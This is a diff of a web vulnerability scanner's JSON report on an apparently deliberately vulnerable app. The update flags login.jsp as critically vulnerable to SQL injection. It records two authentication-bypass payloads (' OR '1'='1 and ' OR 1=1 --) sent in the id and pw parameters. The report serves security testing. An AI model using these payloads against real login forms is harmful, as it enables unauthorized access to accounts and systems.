@@ -1,10 +1,10 @@
 {
   "target": "http://15.164.60.79/vulnapp/",
   "scanner": "signature-based-web-vuln-scanner",
-  "generated_at": "2026-05-14 09:32:57",
+  "generated_at": "2026-05-14 10:02:55",
   "summary": {
     "total": 12,
-    "vulnerable": 6
+    "vulnerable": 7
   },
   "results": [
     {
@@ -57,10 +57,50 @@
       "owasp": "A03:2021 Injection",
       "name": "SQL Injection",
       "target": "/vulnapp/login.jsp",
-      "vulnerable": false,
-      "severity": "info",
+      "vulnerable": true,
+      "severity": "critical",
       "evidence": {
-        "findings": [],
+        "login_url": "http://15.164.60.79/vulnapp/login.jsp",
+        "form": {
+          "action": "http://15.164.60.79/vulnapp/login.jsp",
+          "method": "GET",
+          "params": [
+            {
+              "name": "id",
+              "type": "text"
+            },
+            {
+              "name": "pw",
+              "type": "text"
+            }
+          ]
+        },
+        "findings": [
+          {
+            "payload": "' OR '1'='1",
+            "data": {
+              "id": "' OR '1'='1",
+              "pw": "' OR '1'='1"
+            },
+            "status": 200,
+            "elapsed": 0.01,
+            "error_hit": [],
+            "auth_bypass": true,
+            "time_based": false
+          },
+          {
+            "payload": "' OR 1=1 -- ",
+            "data": {
+              "id": "' OR 1=1 -- ",
+              "pw": "' OR 1=1 -- "
+            },
+            "status": 200,
+            "elapsed": 0.01,
+            "error_hit": [],
+            "auth_bypass": true,
+            "time_based": false
+          }
+        ],
         "sqlmap": null
       }
     },
@@ -98,7 +138,7 @@
       "target": "Set-Cookie Header",
       "vulnerable": true,
       "severity": "medium",
-      "evidence": "missing=['Secure', 'SameSite'], set-cookie=JSESSIONID=327157E3F70E1758C120EFFFE9CAAEC8; Path=/vulnapp; HttpOnly"
+      "evidence": "missing=['Secure', 'SameSite'], set-cookie=JSESSIONID=346827265F1F1C03337E7164A524FFA9; Path=/vulnapp; HttpOnly"
     },
     {
       "check_id": "WEB-011",
